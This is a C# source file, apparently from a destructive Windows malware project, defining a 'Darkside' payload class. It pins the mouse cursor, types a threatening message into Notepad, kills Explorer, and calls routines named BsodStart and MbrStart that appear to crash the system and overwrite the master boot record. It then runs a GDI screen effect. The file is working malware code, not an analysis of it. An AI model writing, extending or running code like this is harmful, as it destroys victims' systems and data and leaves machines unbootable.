using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System;

namespace Nightmare.Payloads
{
    public class Darkside
    {
        private static string words = "THERE IS NO ESCAPE NOW.DO NOT TRY TO CLOSE THIS WINDOW,YOUR COMPUTER IS NOW DONE FOR ANYWAY."
                              + "DO YOU WANT TO ENJOY THE LAST MINUTES USING YOUR COMPUTER? " + "GOOD LUCK.";

        public void Payload()
        {
            Process.Start(@"C:\Windows\notepad.exe");
            Process[] notepadProcess = Process.GetProcessesByName("notepad");
            Process[] explorerProcess = Process.GetProcessesByName("explorer");

            while (notepadProcess.Length == 0) { }

            Thread.Sleep(1000);
            Thread mouse = new Thread(MouseEvent);
            mouse.Start();

            char[] wordChar = words.ToCharArray();
            DLLImport.INPUT[] input = new DLLImport.INPUT[2];
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;

            for (int num = 0; num < 150; num++)
            {
                IntPtr findWindow = DLLImport.FindWindow("Notepad", null);
                DLLImport.MoveWindow(findWindow, 100, 100, x / 2, y / 3, true);

                UInt16 unicode = wordChar[num];

                input[0].type = DLLImport.InputType.INPUT_KEYBOARD;
                input[0].U.ki.wScan = (DLLImport.ScanCodeShort)unicode;
                input[0].U.ki.dwFlags = DLLImport.KEYEVENTF.UNICODE;

                input[1].type = DLLImport.InputType.INPUT_KEYBOARD;
                input[1].U.ki.wVk = DLLImport.VirtualKeyShort.RETURN;

                if (wordChar[num] != ',' && wordChar[num] != '.' && num != 129)
                    DLLImport.SendInput(1, input, Marshal.SizeOf(typeof(DLLImport.INPUT)));
                else
                    DLLImport.SendInput(2, input, Marshal.SizeOf(typeof(DLLImport.INPUT)));

                Thread.Sleep(200);
            }

            while (Convert.ToBoolean(DLLImport.GetKeyState(DLLImport.VirtualKeyStates.VK_RETURN) & DLLImport.KEY_PRESSED)) { }

            for (int num = 151; num < wordChar.Length; num++)
            {
                IntPtr findWindow = DLLImport.FindWindow("Notepad", null);
                DLLImport.MoveWindow(findWindow, 100, 100, x / 2, y / 3, true);

                UInt16 unicode = wordChar[num];

                input[0].type = DLLImport.InputType.INPUT_KEYBOARD;
                input[0].U.ki.wScan = (DLLImport.ScanCodeShort)unicode;
                input[0].U.ki.dwFlags = DLLImport.KEYEVENTF.UNICODE;

                DLLImport.SendInput(1, input, Marshal.SizeOf(typeof(DLLImport.INPUT)));

                Thread.Sleep(200);
            }

            Thread.Sleep(1000);

            foreach (Process process in notepadProcess) { process.Kill(); }

            foreach (Process process in explorerProcess) { process.Kill(); }

            Process.Start(@"C:\Windows\System32\cmd.exe");

            Process.Start(@"C:\Windows\System32\mspaint.exe");

            Bsod.BsodStart();

            Mbr.MbrStart();

            var gdi = new Gdi();
            Thread thread = new Thread(gdi.GDIPayload);
            thread.Start();
            Thread.Sleep(60000);
            Environment.Exit(-1);
        }

        public void MouseEvent()
        {
            Process[] proces_name = Process.GetProcessesByName("notepad");
            while (proces_name.Length == 1)
            {
                proces_name = Process.GetProcessesByName("notepad");
                DLLImport.SetCursorPos(300, 300);
                Thread.Sleep(1);
            }
        }
    }
}